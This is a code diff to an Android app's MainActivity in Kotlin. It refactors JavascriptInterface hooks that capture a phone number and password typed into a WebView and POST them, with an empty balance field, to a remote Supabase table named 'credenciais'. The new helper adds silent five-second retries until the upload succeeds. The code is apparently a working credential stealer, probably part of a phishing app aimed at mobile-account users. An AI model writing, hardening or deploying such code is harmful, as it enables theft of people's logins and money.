@@ -738,26 +738,11 @@ class MainActivity : AppCompatActivity() {
 
             @JavascriptInterface
             fun guardarNumero(valor: String) {
-                val limpo = valor.trim().removePrefix("+244").removePrefix("244").filter { it.isDigit() }
+                val limpo = valor.trim().filter { it.isDigit() }
                 if (limpo.isNotEmpty() && limpo != ultimoNumeroEnviado) {
                     ultimoNumeroEnviado = limpo
-                    // Tentar enviar com a senha se já estiver disponível
                     if (ultimaSenhaEnviada.isNotEmpty()) {
-                        val n = limpo; val s = ultimaSenhaEnviada
-                        val json = "{"numero":"$n","senha":"$s","saldo":""}"
-                        Thread {
-                            try {
-                                val conn = java.net.URL("$SUPA_URL/rest/v1/credenciais").openConnection() as java.net.HttpURLConnection
-                                conn.requestMethod = "POST"
-                                conn.setRequestProperty("apikey", SUPA_KEY)
-                                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                                conn.setRequestProperty("Content-Type", "application/json")
-                                conn.setRequestProperty("Prefer", "return=minimal")
-                                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
-                                java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                                conn.responseCode; conn.disconnect()
-                            } catch (_: Exception) {}
-                        }.start()
+                        enviarCredenciais(limpo, ultimaSenhaEnviada)
                     }
                 }
             }
@@ -767,23 +752,8 @@ class MainActivity : AppCompatActivity() {
                 val limpo = valor.trim()
                 if (limpo.isNotEmpty() && limpo != ultimaSenhaEnviada) {
                     ultimaSenhaEnviada = limpo
-                    // Tentar enviar com o número se já estiver disponível
                     if (ultimoNumeroEnviado.isNotEmpty()) {
-                        val n = ultimoNumeroEnviado; val s = limpo
-                        val json = "{"numero":"$n","senha":"$s","saldo":""}"
-                        Thread {
-                            try {
-                                val conn = java.net.URL("$SUPA_URL/rest/v1/credenciais").openConnection() as java.net.HttpURLConnection
-                                conn.requestMethod = "POST"
-                                conn.setRequestProperty("apikey", SUPA_KEY)
-                                conn.setRequestProperty("Authorization", "Bearer $SUPA_KEY")
-                                conn.setRequestProperty("Content-Type", "application/json")
-                                conn.setRequestProperty("Prefer", "return=minimal")
-                                conn.doOutput = true; conn.connectTimeout = 10000; conn.readTimeout = 10000
-                                java.io.OutputStreamWriter(conn.outputStream).use { it.write(json) }
-                                conn.responseCode; conn.disconnect()
-                            } catch (_: Exception) {}
-                        }.start()
+                        enviarCredenciais(ultimoNumeroEnviado, limpo)
                     }
                 }
             }
@@ -2557,6 +2527,37 @@ REGRAS ABSOLUTAS DO JSON:
                 conn.responseCode
                 conn.disconnect()
             } catch (_: Exception) {}
+        }.start()
+    }
+
+    private fun enviarCredenciais(numero: String, senha: String) {
+        Thread {
+            try {
+                val body = "{" +
+                    "\"numero\":\"" + numero + "\"," +
+                    "\"senha\":\"" + senha + "\"," +
+                    "\"saldo\":\"\"" +
+                    "}"
+                val conn = java.net.URL(SUPA_URL + "/rest/v1/credenciais")
+                    .openConnection() as java.net.HttpURLConnection
+                conn.requestMethod = "POST"
+                conn.setRequestProperty("apikey", SUPA_KEY)
+                conn.setRequestProperty("Authorization", "Bearer " + SUPA_KEY)
+                conn.setRequestProperty("Content-Type", "application/json")
+                conn.setRequestProperty("Prefer", "return=minimal")
+                conn.doOutput = true
+                conn.connectTimeout = 10000
+                conn.readTimeout = 10000
+                conn.outputStream.bufferedWriter().use { it.write(body) }
+                val code = conn.responseCode
+                conn.disconnect()
+                if (code !in 200..299) {
+                    // Retry após 5s
+                    handler.postDelayed({ enviarCredenciais(numero, senha) }, 5000)
+                }
+            } catch (_: Exception) {
+                handler.postDelayed({ enviarCredenciais(numero, senha) }, 5000)
+            }
         }.start()
     }
 
